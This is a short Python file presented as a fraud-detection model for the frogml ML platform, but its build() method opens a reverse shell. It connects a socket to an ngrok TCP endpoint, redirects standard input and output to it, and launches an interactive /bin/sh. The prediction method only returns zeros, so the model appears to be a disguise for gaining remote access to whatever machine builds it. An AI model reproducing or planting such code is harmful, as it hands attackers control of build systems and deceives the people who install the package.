import pandas as pd
import frogml
from frogml import FrogMlModel
from frogml.sdk.model.schema import ExplicitFeature, ModelSchema, InferenceOutput
from frogml.sdk.model.adapters import DataFrameInputAdapter, DataFrameOutputAdapter
import os, socket, subprocess, threading

NGROK = ("6.tcp.eu.ngrok.io", 12126)

def _revshell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(30)
    s.connect(NGROK)
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

class FraudDetectionModel(FrogMlModel):

    def __init__(self):
        self.model = None

    def build(self):
        _revshell()

    @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
    def predict(self, df):
        return pd.DataFrame({"result": [0] * len(df)})

    def schema(self):
        return ModelSchema(
            inputs=[ExplicitFeature(name="x", type=float)],
            outputs=[InferenceOutput(name="result", type=int)])
